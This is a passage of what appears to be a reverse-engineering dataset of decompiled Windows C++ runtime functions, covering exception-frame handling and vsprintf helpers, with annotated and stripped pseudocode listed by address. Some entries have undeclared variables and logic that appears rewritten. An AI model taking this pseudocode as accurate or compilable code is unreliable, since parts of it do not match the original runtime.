**)(*(int *)((int)param_1 + 0x1c) + 0xc) + 1);\n                            do {\n                                while (local_24 = iVar7, 0 < local_24) {\n                                    if (TypeMatchHelper<struct__s_HandlerType_const_>(local_14, *pp_Var4, *(_s_ThrowInfo **)((int)param_1 + 0x1c))) {\n                                        local_5 = '\\x01';\n                                        CatchIt<class___FrameHandler3>(param_1, param_2, local_10, param_4, param_5, local_14, *pp_Var4, local_14, param_7, param_8, (uchar)local_2c);\n                                        goto LAB_1001a830;\n                                    }\n                                    iVar7 = local_34;\n                                    pp_Var4++;\n                                    local_24--;\n                                }\n                                local_14++;\n                            } while (++local_28 != local_38);\n                        }\n                    }\n                    local_40 = (_s_FuncInfo *)((int)local_40 + 0x14);\n                } while (++local_1c < local_4c);\n            }\n        }\n        if (param_6 != '\\0') {\n            ___DestructExceptionObject((int *)param_1);\n        }\n        if ((local_5 == '\\0') && (0x19930520 < (param_5->magicNumber_and_bbtFlags & 0x1fffffff)) &&\n            (param_5->pESTypeList != (ESTypeList *)0x0 || \n            (((uint)param_5->EHFlags >> 2 & 1) != 0 && (param_7 == 0))))) {\n            \n            if (((uint)param_5->EHFlags >> 2 & 1) != 0) goto LAB_1001a928;\n            uVar5 = IsInExceptionSpec(param_1, param_5->pESTypeList);\n            if (uVar5 == '\\0') {\nLAB_1001a8e9:\n                iVar9 = ___vcrt_getptd();\n                *(EHExceptionRecord **)(iVar9 + 0x10) = param_1;\n                *(_CONTEXT **)(iVar9 + 0x14) = local_10;\n                if (param_8 == (EHRegistrationNode *)0x0) {\n                    param_8 = param_2;\n                }\n                _UnwindNestedFrames(param_8, param_1);\n                __FrameHandler3::FrameUnwindToEmptyState(param_2, param_4, param_5);\n                _s_ESTypeList *p_Var8 = __FrameHandler3::getESTypes(param_5);\n                FUN_1001ade5(p_Var8);\n                goto LAB_1001a928;\n            }\n        }\n    } else if (param_5->nTryBlocks != 0) {\n        if (param_6 != '\\0') goto LAB_1001a928;\n        FindHandlerForForeignException<class___FrameHandler3>(param_1, param_2, local_10, param_4, param_5, local_c, param_7, param_8);\n    }\n    iVar9 = ___vcrt_getptd();\n    if (*(int *)(iVar9 + 0x1c) == 0) return;\nLAB_1001a928:\n    _terminate();\n    ((code *)swi(3))();\n    return;\n}"}
{"Function Name": "FindHandlerForForeignException<class___FrameHandler3>", "Address": "1001a92e", "Source Code": "\\*\nvoid __cdecl\nFindHandlerForForeignException<class___FrameHandler3>\n(EHExceptionRecord *param_1, EHRegistrationNode *param_2, _CONTEXT *param_3, void *param_4,\n_s_FuncInfo *param_5, int param_6, int param_7, EHRegistrationNode *param_8)\n{\n    code *pcVar1; \n    int iVar2; \n    PVOID pvVar3; \n    _s_HandlerType *p_Var4; \n    _s_TryBlockMapEntry *p_Var5; \n    uint uVar6; \n    int *local_24; \n    uint local_20; \n    uint local_18; \n    \n    if (*(int *)param_1 != -0x7ffffffd) {\n        iVar2 = ___vcrt_getptd(); \n        \n        if (*(int *)(iVar2 + 8) != 0) {\n            pvVar3 = EncodePointer((PVOID)0x0); \n            \n            if ((((*(PVOID *)(iVar2 + 8) != pvVar3) && (*(int *)param_1 != -0x1fbcb0b3)) &&\n                (*(int *)param_1 != -0x1fbcbcae)) &&\n                (iVar2 = _CallSETranslator(param_1, param_2, param_3, param_4, param_5, param_7, param_8),\n                iVar2 != 0)) {\n                return; \n            }\n        }\n        \n        if (param_5->nTryBlocks == 0) {\n            _terminate(); \n            pcVar1 = (code *)swi(3); \n            (*pcVar1)(); \n            return; \n        }\n        \n        __FrameHandler3::GetRangeOfTrysToCheck(&local_24, &param_5, param_6, param_7);\n        \n        if (local_20 < local_18) {\n            int local_c = local_20 * 0x14; \n            uint uVar6 = local_20; \n            do {\n                \n                p_Var5 = (_s_TryBlockMapEntry *)(*(int *)(*local_24 + 0x10) + local_c);\n                \n                if ((p_Var5->tryLow <= param_6) && (param_6 <= p_Var5->tryHigh)) {\n                    p_Var4 = p_Var5->pHandlerArray + p_Var5->nCatches - 1; \n                    \n                    if (((p_Var4->pType == (TypeDescriptor *)0x0) ||\n                        (*(char *)&p_Var4->pType[1].pVFTable == '\\0')) &&\n                        ((*(byte *)&p_Var4->adjectives & 0x40) == 0)) {\n                        \n                        CatchIt<class___FrameHandler3>\n                        (param_1, param_2, param_3, param_4, param_5, p_Var4, (_s_CatchableType *)0x0, p_Var5,\n                        param_7, param_8, '\\x01');\n                    }\n                }\n                local_c += 0x14; \n                uVar6++; \n            } while (uVar6 < local_18); \n        }\n    }\n    return; \n}\n*\\ \n \nvoid __cdecl\nFindHandlerForForeignException<class___FrameHandler3>\n(EHExceptionRecord *param_1, EHRegistrationNode *param_2, _CONTEXT *param_3, void *param_4,\n_s_FuncInfo *param_5, int param_6, int param_7, EHRegistrationNode *param_8)\n{\n    code *pcVar1;\n    int iVar2;\n    PVOID pvVar3;\n    _s_HandlerType *p_Var4;\n    _s_TryBlockMapEntry *p_Var5;\n    uint uVar6;\n    int *local_24;\n    uint local_20;\n    uint local_18;\n    if (*(int *)param_1 != -0x7ffffffd) {\n        iVar2 = ___vcrt_getptd();\n        if (*(int *)(iVar2 + 8) != 0) {\n            pvVar3 = EncodePointer((PVOID)0x0);\n            if ((((*(PVOID *)(iVar2 + 8) != pvVar3) && (*(int *)param_1 != -0x1fbcb0b3)) &&\n                (*(int *)param_1 != -0x1fbcbcae)) &&\n                (iVar2 = _CallSETranslator(param_1, param_2, param_3, param_4, param_5, param_7, param_8),\n                iVar2 != 0)) {\n                return;\n            }\n        }\n        if (param_5->nTryBlocks == 0) {\n            _terminate();\n            pcVar1 = (code *)swi(3);\n            (*pcVar1)();\n            return;\n        }\n        __FrameHandler3::GetRangeOfTrysToCheck(&local_24, &param_5, param_6, param_7);\n        if (local_20 < local_18) {\n            int local_c = local_20 * 0x14;\n            uint uVar6 = local_20;\n            do {\n                p_Var5 = (_s_TryBlockMapEntry *)(*(int *)(*local_24 + 0x10) + local_c);\n                if ((p_Var5->tryLow <= param_6) && (param_6 <= p_Var5->tryHigh)) {\n                    p_Var4 = p_Var5->pHandlerArray + p_Var5->nCatches - 1;\n                    if (((p_Var4->pType == (TypeDescriptor *)0x0) ||\n                        (*(char *)&p_Var4->pType[1].pVFTable == '\\0')) &&\n                        ((*(byte *)&p_Var4->adjectives & 0x40) == 0)) {\n                        CatchIt<class___FrameHandler3>\n                        (param_1, param_2, param_3, param_4, param_5, p_Var4, (_s_CatchableType *)0x0, p_Var5,\n                        param_7, param_8, '\\x01');\n                    }\n                }\n                local_c += 0x14;\n                uVar6++;\n            } while (uVar6 < local_18);\n        }\n    }\n    return;\n}"}
{"Function Name": "std::bad_exception::bad_exception", "Address": "1001abea", "Source Code": "\\*\nBadException * thisCall std::BadException::BadException(BadException *instance)\n{\n    \n    *(char **)(instance + 4) = \"bad exception\";\n    \n    \n    *(undefined ***)instance = virtualFunctionTable;\n    \n    \n    return instance;\n}\n*\\ \n \nBadException * thisCall std::BadException::BadException(BadException *instance)\n{\n    *(char **)(instance + 4) = \"bad exception\";\n    *(undefined ***)instance = virtualFunctionTable;\n    return instance;\n}"}
{"Function Name": "type_info::operator==", "Address": "1001ac02", "Source Code": "\\*\nbool call_operator TypeInfo::operator==(TypeInfo *currentTypeInfo, TypeInfo *otherTypeInfo)\n{\n    \n    \n    \n    return (bool)('\\x01' - (stdTypeInfoCompare((int)(currentTypeInfo + 4), (int)(otherTypeInfo + 4)) != 0));\n}\n*\\ \n \nbool call_operator TypeInfo::operator==(TypeInfo *currentTypeInfo,TypeInfo *otherTypeInfo)\n{\n    return (bool)('\\x01' - (stdTypeInfoCompare((int)(currentTypeInfo + 4),(int)(otherTypeInfo + 4)) != 0));\n}"}
{"Function Name": "CallCatchBlock", "Address": "1001ac21", "Source Code": "void * __cdecl\nCallCatchBlock(EHExceptionRecord *param_1, EHRegistrationNode *param_2, _CONTEXT *param_3,\n_s_FuncInfo *param_4, void *param_5, int param_6, ulong param_7)\n{\n    void *pvVar2; \n    undefined4 *local_38; \n    \n    local_38 = __CreateFrameInfo(NULL, *(undefined4 *)(param_1 + 0x18));\n    \n    int iVar1 = ___vcrt_getptd();\n    \n    *(EHExceptionRecord **)(iVar1 + 0x10) = param_1;\n    *(undefined4 **)(iVar1 + 0x14) = param_3;\n    \n    pvVar2 = _CallCatchBlock2(param_2, param_4, param_5, param_6, param_7);\n    \n    FUN_1001ad69();\n    \n    return pvVar2;\n}"}
{"Function Name": "FUN_1001ad69", "Address": "1001ad69", "Source Code": "void FUN_1001ad69(void)\n{\n    int *exception_pointer; \n    \n    *(undefined4 *)(*(int *)(base_pointer + 0xc) + -4) = *(undefined4 *)(base_pointer + -0x30);\n    \n    \n    __FindAndUnlinkFrame(*(int *)(base_pointer + -0x34));\n    \n    \n    int thread_data = ___vcrt_getptd();\n    \n    \n    *(undefined4 *)(thread_data + 0x10) = *(undefined4 *)(base_pointer + -0x38);\n    *(undefined4 *)(thread_data + 0x14) = *(undefined4 *)(base_pointer + -0x3c);\n    \n    \n    if ((((*exception_pointer == -0x1f928c9d) && (exception_pointer[4] == 3)) &&\n        (exception_pointer[5] >= 0x19930520 && exception_pointer[5] <= 0x19930522)) && \n        (*(int *)(base_pointer + -0x40) == 0 && (exception_flag != 0)))) {\n        \n        \n        if (__IsExceptionObjectToBeDestroyed(exception_pointer[6]) != 0) {\n            ___DestructExceptionObject(exception_pointer);\n        }\n    }\n    return; \n}"}
{"Function Name": "FUN_1001ade5", "Address": "1001ade5", "Source Code": "void FUN_1001ade5(undefined4 input_param)\n{\n    int thread_local_data_ptr = ___vcrt_getptd(); \n    if (*(int *)(thread_local_data_ptr + 0x1c) == 0) { \n        _unexpected(); \n        *(undefined4 *)(thread_local_data_ptr + 0x1c) = input_param; \n        __CxxThrowException_8((int *)0x0, (byte *)0x0); \n    }\n    _terminate(); \n    ((code *)swi(3))(); \n}"}
{"Function Name": "Catch_All@1001ae05", "Address": "1001ae05", "Source Code": "void Catch_All_1001ae05(void)\n{\n    int threadLocalDataPointer; \n    threadLocalDataPointer = ___vcrt_getptd(); \n    *(undefined4 *)(threadLocalDataPointer + 0x1c) = *(undefined4 *)(basePointer + 8); \n    throwException((int *)0x0,(byte *)0x0); \n    terminateProgram(); \n    ((code *)systemInterrupt(3))(); \n}"}
{"Function Name": "ExFilterRethrow", "Address": "1001ae1f", "Source Code": "int __cdecl ExFilterRethrow(_EXCEPTION_POINTERS *exceptionPointers)\n{\n    \n    PEXCEPTION_RECORD exceptionRecord = exceptionPointers->ExceptionRecord;\n    \n    if (exceptionRecord->ExceptionCode == 0xe06d7363 && \n        \n        exceptionRecord->NumberParameters == 3 && \n        \n        (exceptionRecord->ExceptionInformation[0] == 0x19930520 || \n         exceptionRecord->ExceptionInformation[0] == 0x19930521 || \n         exceptionRecord->ExceptionInformation[0] == 0x19930522) && \n        \n        exceptionRecord->ExceptionInformation[2] == 0) \n    {\n        \n        *(undefined4 *)(___vcrt_getptd() + 0x20) = 1;\n        \n        return 1;\n    }\n    \n    return 0;\n}"}
{"Function Name": "__FrameHandler3::FrameUnwindToEmptyState", "Address": "1001ae69", "Source Code": "void __cdecl\n__FrameHandler3::FrameUnwindToEmptyState\n(EHRegistrationNode *param_1, void *param_2, _s_FuncInfo *param_3)\n{\n    \n    \n    \n    \n    \n    \n    FrameUnwindToState(param_1, param_2, param_3, -1);\n}"}
{"Function Name": "__FrameHandler3::FrameUnwindToState", "Address": "1001ae81", "Source Code": "void __cdecl\n__FrameHandler3::FrameUnwindToState\n(EHRegistrationNode *param_1, void *param_2, _s_FuncInfo *param_3, int param_4)\n{\n    \n    int iVar2 = GetCurrentState(param_1, param_2, param_3);\n    \n    \n    int iVar3 = ___vcrt_getptd();\n    \n    \n    *(int *)(iVar3 + 0x18) += 1;\n    \n    while ((iVar3 = iVar2) != param_4) {\n        \n        if ((iVar3 < 0) || (param_3->maxState <= iVar3)) goto LAB_1001af63;\n        \n        iVar2 = param_3->pUnwindMap[iVar3].toState;\n        \n        if (param_3->pUnwindMap[iVar3].action != (action *)0x0) {\n            \n            SetState(param_1, param_3, iVar2);\n            \n            __CallSettingFrame_12(param_3->pUnwindMap[iVar3].action, param_1, 0x103);\n        }\n    }\n    \n    FUN_1001af4f();\n    SetState(param_1, param_3, iVar3);\n    return;\nLAB_1001af63:\n    \n    _terminate();\n    \n    ((code *)swi(3))();\n    return;\n}"}
{"Function Name": "FUN_1001af4f", "Address": "1001af4f", "Source Code": "void FUN_1001af4f(void) \n{\n    int threadLocalStoragePointer = ___vcrt_getptd(); \n    if (0 < *(int *)(threadLocalStoragePointer + 0x18)) { \n        *(int *)(threadLocalStoragePointer + 0x18) = *(int *)(threadLocalStoragePointer + 0x18) - 1; \n    }\n}"}
{"Function Name": "IsInExceptionSpec", "Address": "1001af69", "Source Code": "uchar __cdecl IsInExceptionSpec(EHExceptionRecord *exceptionRecord, _s_ESTypeList *typeList)\n{\n    _s_CatchableType **catchableTypesPtr; \n    HandlerType *handlerTypesPtr; \n    uchar returnValue = '\\0'; \n    int typeCount; \n    \n    if (typeList == (_s_ESTypeList *)0x0) {\n        _terminate(); \n        return ((code *)swi(3))(); \n    }\n    \n    typeCount = typeList->nCount; \n    \n    if (typeCount > 0) {\n        \n        catchableTypesPtr = *(_s_CatchableType ***)(*(int *)(exceptionRecord + 0x1c) + 0xc);\n        do {\n            _s_CatchableType *currentCatchableType = *catchableTypesPtr; \n            \n            if (currentCatchableType > 0) {\n                handlerTypesPtr = typeList->pTypeArray; \n                \n                for (int handlerIndex = 0; handlerIndex < 0x10; handlerIndex++) {\n                    \n                    if (TypeMatchHelper<struct__s_HandlerType_const_>((_s_HandlerType *)((int)&handlerTypesPtr->adjectives + handlerIndex), *catchableTypesPtr, *(_s_ThrowInfo **)(exceptionRecord + 0x1c))) {\n                        return '\\x01'; \n                    }\n                    catchableTypesPtr++; \n                }\n            }\n            typeCount--; \n        } while (typeCount != 0); \n    }\n    return returnValue; \n}"}
{"Function Name": "_CallMemberFunction1", "Address": "1001b003", "Source Code": "void _CallMemberFunction1(void *context, void *function_ptr, void *argument)\n{\n    \n    (*(code *)function_ptr)(argument);\n}"}
{"Function Name": "_CallMemberFunction2", "Address": "1001b013", "Source Code": "void _CallMemberFunction2(void *context, void *function_ptr, void *arg1, int arg2)\n{\n    \n    \n    (*(code *)function_ptr)(arg1, arg2);\n}"}
{"Function Name": "__FrameHandler3::getESTypes", "Address": "1001b026", "Source Code": "\\*\nESTypeList * cdecl FrameHandler::getESTypes(FuncInfo *funcInfo)\n{\n    \n    return funcInfo->pESTypeList;\n}\n*\\ \n \nESTypeList * cdecl FrameHandler::getESTypes(FuncInfo *funcInfo)\n{\n    return funcInfo->pESTypeList;\n}"}
{"Function Name": "FUN_1001b0e9", "Address": "1001b0e9", "Source Code": "void FUN_1001b0e9(void) \n{\n    destinationValue = sourceValue; \n}"}
{"Function Name": "___vcrt_initialize_locks", "Address": "1001b0f4", "Source Code": "undefined4 ___vcrt_initialize_locks(void)\n{\n    uint loopCounter = 0; \n    LPCRITICAL_SECTION criticalSectionPtr = (LPCRITICAL_SECTION)&DAT_1004fd4c; \n    do {\n        \n        if (___vcrt_InitializeCriticalSectionEx(criticalSectionPtr, 4000, 0) == 0) {\n            \n            return ___vcrt_uninitialize_locks() & 0xffffff00;\n        }\n        initializedSectionCount++; \n        loopCounter += 0x18; \n        criticalSectionPtr++; \n    } while (loopCounter < 0x18); \n    return 1; \n}"}
{"Function Name": "___vcrt_FlsAlloc", "Address": "1001b292", "Source Code": "void __cdecl ___vcrt_FlsAlloc(undefined4 function_param)\n{\n    \n    code *fls_alloc_function = (code *)try_get_function(0, \"FlsAlloc\", (module_id *)&DAT_1003d814, (module_id *)&DAT_1003d81c);\n    \n    \n    if (fls_alloc_function != (code *)0x0) {\n        \n        (*(code *)guard_check_function)(function_param);\n        \n        \n        (*fls_alloc_function)();\n        return; \n    }\n    \n    \n    fallback_tls_alloc();\n}"}
{"Function Name": "___vcrt_InitializeCriticalSectionEx", "Address": "1001b381", "Source Code": "void __cdecl\n___vcrt_InitializeCriticalSectionEx(LPCRITICAL_SECTION param_1, DWORD param_2, undefined4 param_3)\n{\n    \n    code *pcVar1 = (code *)try_get_function(4, \"InitializeCriticalSectionEx\", (module_id *)&DAT_1003d834, (module_id *)&DAT_1003d83c);\n    \n    \n    if (pcVar1 == (code *)0x0) {\n        \n        InitializeCriticalSectionAndSpinCount(param_1, param_2);\n    } else {\n        \n        (*(code *)PTR__guard_check_icall_1003a2f8)(param_1, param_2, param_3);\n        \n        \n        (*pcVar1)();\n    }\n}"}
{"Function Name": "___vcrt_uninitialize_winapi_thunks", "Address": "1001b3f1", "Source Code": "void __cdecl ___vcrt_uninitialize_winapi_thunks(char inputParam)\n{\n    \n    HMODULE *hModulePtr = (HMODULE *)&moduleStart;\n    \n    if (inputParam == '\\0') {\n        \n        do {\n            \n            if (*hModulePtr && *hModulePtr != (HMODULE)0xffffffff) {\n                \n                FreeLibrary(*hModulePtr);\n            }\n            \n            *hModulePtr++ = (HMODULE)0x0;\n        } while (hModulePtr != (HMODULE *)&moduleEnd); \n    }\n}"}
{"Function Name": "@_EH4_GlobalUnwind2@8", "Address": "1001b564", "Source Code": "void __fastcall __EH4_GlobalUnwind2_8(PVOID contextPointer, PEXCEPTION_RECORD exceptionRecord)\n{\n    \n    RtlUnwind(contextPointer, (PVOID)0x1001b579, exceptionRecord, NULL);\n}"}
{"Function Name": "__FrameHandler3::GetCurrentState", "Address": "1001b5b4", "Source Code": "int __cdecl\n__FrameHandler3::GetCurrentState(EHRegistrationNode *param_1, void *param_2, _s_FuncInfo *param_3)\n{\n    \n    if (param_3->maxState < 0x81) {\n        \n        return (int)(char)param_1[8];\n    }\n    \n    return *(int *)(param_1 + 8);\n}"}
{"Function Name": "__FrameHandler3::SetState", "Address": "1001b5d1", "Source Code": "void __cdecl __FrameHandler3::SetState(EHRegistrationNode *eh_registration_node, _s_FuncInfo *func_info, int state_value)\n{\n    \n    \n    eh_registration_node->state = state_value;\n}"}
{"Function Name": "__NLG_Notify1", "Address": "1001b6f0", "Source Code": "undefined4 __fastcall __NLG_Notify1(undefined4 input_value)\n{\n    \n    global_variable = input_value;\n    \n    \n    return return_value;\n}"}
{"Function Name": "FUN_1001b71b", "Address": "1001b71b", "Source Code": "void FUN_1001b71b(void) \n{\n    (*(code *)function_pointer)(); \n}"}
{"Function Name": "common_vsprintf<class___crt_stdio_output::format_validation_base,char>", "Address": "1001b71e", "Source Code": "\\*\nint __cdecl\ncommon_vsprintf<class___crt_stdio_output::format_validation_base,char>\n(__uint64 param_1,char *param_2,uint param_3,char *param_4,__crt_locale_pointers *param_5,\nchar *param_6)\n{\n    undefined4 *******pppppppuVar1; \n    int iVar3; \n    int local_488; \n    char local_484[8]; \n    uint local_478; \n    undefined4 *******local_464; \n    output_adapter_data<char,class___crt_stdio_output::string_output_adapter<char>_> local_460[64]; \n    formatting_buffer local_420[1040]; \n    uint local_8 = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    local_464 = (undefined4 *******)param_2; \n    \n    if ((param_4 == (char *)0x0) || ((param_3 != 0 && (param_2 == (char *)0x0)))) {\n        *(undefined4 *)FUN_100253b8() = 0x16; \n        FUN_1001de96(); \n        goto LAB_1001b873; \n    }\n    FUN_1001bfff(&local_488, (__acrt_ptd **)param_5); \n    pppppppuVar1 = local_464; \n    local_478 = (uint)param_1 & 2; \n    \n    if (((param_1 & 2) != 0) || (local_464 == (undefined4 *******)0x0)) {\n        local_464 = (undefined4 *******)1; \n    }\n    \n    __crt_stdio_output::\n    output_adapter_data<char,class___crt_stdio_output::string_output_adapter<char>_>::\n    output_adapter_data<char,class___crt_stdio_output::string_output_adapter<char>_>\n    (local_460, (string_output_adapter<char> *)&local_464, CONCAT44(param_4, param_1._4_4_), local_484, (__crt_locale_pointers *)param_6, (char *)0);\n    \n    \n    iVar3 = __crt_stdio_output::\n    output_processor<char,class___crt_stdio_output::string_output_adapter<char>,class___crt_stdio_output::format_validation_base<char,class___crt_stdio_output::string_output_adapter<char>_>_>\n    ::process((output_processor<char,class___crt_stdio_output::string_output_adapter<char>,class___crt_stdio_output::format_validation_base<char,class___crt_stdio_output::string_output_adapter<char>_>_>)local_460);\n    \n    \n    if (pppppppuVar1 != (undefined4 *******)0x0) {\n        \n        if ((param_1 & 1) == 0) {\n            if (local_478 == 0) {\n                if (param_3 != 0) {\n                    if (local_46c != param_3) goto LAB_1001b84b; \n                    *(undefined *)((int)pppppppuVar1 + (param_3 - 1)) = 0; \n                }\n            } else if (param_3 != 0) {\n                if (-1 < iVar3) {\n                    if (local_46c == param_3) goto LAB_1001b898; \n                    goto LAB_1001b84b; \n                }\n                *(undefined *)pppppppuVar1 = 0; \n            }\n        } else if (((param_3 != 0) || (iVar3 == 0)) && (local_46c != param_3)) {\n            LAB_1001b84b:\n            *(undefined *)((int)pppppppuVar1 + local_46c) = 0; \n        }\n    }\n    __crt_stdio_output::formatting_buffer::~formatting_buffer(local_420); \n    if (local_47c != '\\0') {\n        *(uint *)(local_488 + 0x350) &= 0xfffffffd; \n    }\nLAB_1001b873:\n    return ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc); \n}\n*\\ \n \nint __cdecl\ncommon_vsprintf<class___crt_stdio_output::format_validation_base,char>\n(__uint64 param_1,char *param_2,uint param_3,char *param_4,__crt_locale_pointers *param_5,\nchar *param_6)\n{\n    undefined4 *******pppppppuVar1;\n    int iVar3;\n    int local_488;\n    char local_484[8];\n    uint local_478;\n    undefined4 *******local_464;\n    output_adapter_data<char,class___crt_stdio_output::string_output_adapter<char>_> local_460[64];\n    formatting_buffer local_420[1040];\n    uint local_8 = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    local_464 = (undefined4 *******)param_2;\n    if ((param_4 == (char *)0x0) || ((param_3 != 0 && (param_2 == (char *)0x0)))) {\n        *(undefined4 *)FUN_100253b8() = 0x16;\n        FUN_1001de96();\n        goto LAB_1001b873;\n    }\n    FUN_1001bfff(&local_488, (__acrt_ptd **)param_5);\n    pppppppuVar1 = local_464;\n    local_478 = (uint)param_1 & 2;\n    if (((param_1 & 2) != 0) || (local_464 == (undefined4 *******)0x0)) {\n        local_464 = (undefined4 *******)1;\n    }\n    __crt_stdio_output::\n    output_adapter_data<char,class___crt_stdio_output::string_output_adapter<char>_>::\n    output_adapter_data<char,class___crt_stdio_output::string_output_adapter<char>_>\n    (local_460, (string_output_adapter<char> *)&local_464, CONCAT44(param_4, param_1._4_4_), local_484, (__crt_locale_pointers *)param_6, (char *)0);\n    \n    iVar3 = __crt_stdio_output::\n    output_processor<char,class___crt_stdio_output::string_output_adapter<char>,class___crt_stdio_output::format_validation_base<char,class___crt_stdio_output::string_output_adapter<char>_>_>\n    ::process((output_processor<char,class___crt_stdio_output::string_output_adapter<char>,class___crt_stdio_output::format_validation_base<char,class___crt_stdio_output::string_output_adapter<char>_>_>)local_460);\n    \n    if (pppppppuVar1 != (undefined4 *******)0x0) {\n        if ((param_1 & 1) == 0) {\n            if (local_478 == 0) {\n                if (param_3 != 0) {\n                    if (local_46c != param_3) goto LAB_1001b84b;\n                    *(undefined *)((int)pppppppuVar1 + (param_3 - 1)) = 0;\n                }\n            } else if (param_3 != 0) {\n                if (-1 < iVar3) {\n                    if (local_46c == param_3) goto LAB_1001b898;\n                    goto LAB_1001b84b;\n                }\n                *(undefined *)pppppppuVar1 = 0;\n            }\n        } else if (((param_3 != 0) || (iVar3 == 0)) && (local_46c != param_3)) {\n            LAB_1001b84b:\n            *(undefined *)((int)pppppppuVar1 + local_46c) = 0;\n        }\n    }\n    __crt_stdio_output::formatting_buffer::~formatting_buffer(local_420);\n    if (local_47c != '\\0') {\n        *(uint *)(local_488 + 0x350) &= 0xfffffffd;\n    }\nLAB_1001b873:\n    return ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);\n}"}
{"Function Name": "common_vsprintf<class___crt_stdio_output::format_validation_base,wchar_t>", "Address": "1001b89e", "Source Code": "\\*\nint __cdecl\ncommon_vsprintf<class___crt_stdio_output::format_validation_base,wchar_t>\n(__uint64 param_1,wchar_t *param_2,uint param_3,wchar_t *param_4,\n__crt_locale_pointers *param_5,char *param_6)\n{\n    undefined4 *puVar2; \n    int iVar3; \n    int local_488; \n    uint local_478; \n    undefined4 ******local_464; \n    uint local_46c; \n    uint local_470; \n    formatting_buffer local_420[1040]; \n    local_464 = (undefined4 *******)param_2; \n    \n    if ((param_4 == (wchar_t *)0x0) || ((param_3 != 0 && (param_2 == (wchar_t *)0x0)))) {\n        puVar2 = (undefined4 *)FUN_100253b8(); \n        *puVar2 = 0x16; \n        FUN_1001de96(); \n        return 0; \n    }\n    FUN_1001bfff(&local_488,(__acrt_ptd **)param_5); \n    local_478 = (uint)param_1 & 2; \n    local_470 = param_3; \n    local_46c = 0; \n    \n    if (((param_1 & 2) != 0) || (local_464 == (undefined4 *******)0x0)) {\n        local_464 = &local_464; \n    }\n    \n    __crt_stdio_output::\n    output_adapter_data<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>_>::\n    output_adapter_data<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>_>\n    ((output_adapter_data<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>_>\n    *)local_420,(string_output_adapter<wchar_t> *)&local_464,\n    CONCAT44(param_4,param_1._4_4_),(__crt_locale_pointers *)param_6);\n    iVar3 = process(local_420); \n    \n    if (local_464 != (undefined4 *******)0x0) {\n        \n        if ((param_1 & 1) == 0) {\n            \n            if (local_478 == 0 && param_3 != 0 && local_46c != param_3) {\n                *(undefined2 *)((int)local_464 + local_46c * 2) = 0; \n            }\n        } else if ((param_3 != 0 || iVar3 == 0) && local_46c != param_3) {\n            *(undefined2 *)((int)local_464 + local_46c * 2) = 0; \n        }\n    }\n    __crt_stdio_output::formatting_buffer::~formatting_buffer(local_420); \n    \n    if (local_488 != 0) {\n        *(uint *)(local_488 + 0x350) &= 0xfffffffd; \n    }\n    return ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc); \n}\n*\\ \n \nint __cdecl\ncommon_vsprintf<class___crt_stdio_output::format_validation_base,wchar_t>\n(__uint64 param_1,wchar_t *param_2,uint param_3,wchar_t *param_4,\n__crt_locale_pointers *param_5,char *param_6)\n{\n    undefined4 *puVar2;\n    int iVar3;\n    int local_488;\n    uint local_478;\n    undefined4 ******local_464;\n    uint local_46c;\n    uint local_470;\n    formatting_buffer local_420[1040];\n    local_464 = (undefined4 *******)param_2;\n    if ((param_4 == (wchar_t *)0x0) || ((param_3 != 0 && (param_2 == (wchar_t *)0x0)))) {\n        puVar2 = (undefined4 *)FUN_100253b8();\n        *puVar2 = 0x16;\n        FUN_1001de96();\n        return 0; \n    }\n    FUN_1001bfff(&local_488,(__acrt_ptd **)param_5);\n    local_478 = (uint)param_1 & 2;\n    local_470 = param_3;\n    local_46c = 0;\n    if (((param_1 & 2) != 0) || (local_464 == (undefined4 *******)0x0)) {\n        local_464 = &local_464; \n    }\n    __crt_stdio_output::\n    output_adapter_data<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>_>::\n    output_adapter_data<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>_>\n    ((output_adapter_data<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>_>\n    *)local_420,(string_output_adapter<wchar_t> *)&local_464,\n    CONCAT44(param_4,param_1._4_4_),(__crt_locale_pointers *)param_6);\n    iVar3 = process(local_420);\n    if (local_464 != (undefined4 *******)0x0) {\n        if ((param_1 & 1) == 0) {\n            if (local_478 == 0 && param_3 != 0 && local_46c != param_3) {\n                *(undefined2 *)((int)local_464 + local_46c * 2) = 0;\n            }\n        } else if ((param_3 != 0 || iVar3 == 0) && local_46c != param_3) {\n            *(undefined2 *)((int)local_464 + local_46c * 2) = 0;\n        }\n    }\n    __crt_stdio_output::formatting_buffer::~formatting_buffer(local_420);\n    if (local_488 != 0) {\n        *(uint *)(local_488 + 0x350) &= 0xfffffffd;\n    }\n    return ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);\n}"}
{"Function Name": "__crt_stdio_output::formatting_buffer::count<char>", "Address": "1001bb19", "Source Code": "uint __thiscall __crt_stdio_output::buffer_type::get_count<char>(buffer_type *buffer)\n{\n    \n    return (*(int *)(buffer + 0x404) == 0) \n        \n        ? 0x200 \n        \n        : *(uint *)(buffer + 0x400) >> 1;\n}"}
{"Function Name": "FUN_1001bb31", "Address": "1001bb31", "Source Code": "uint __fastcall check_memory_value(int input_address)\n{\n    \n    if (*(int *)(input_address + 0x404) == 0) {\n        \n        return 0x100;\n    }\n    \n    return *(uint *)(input_address + 0x400) >> 2;\n}"}
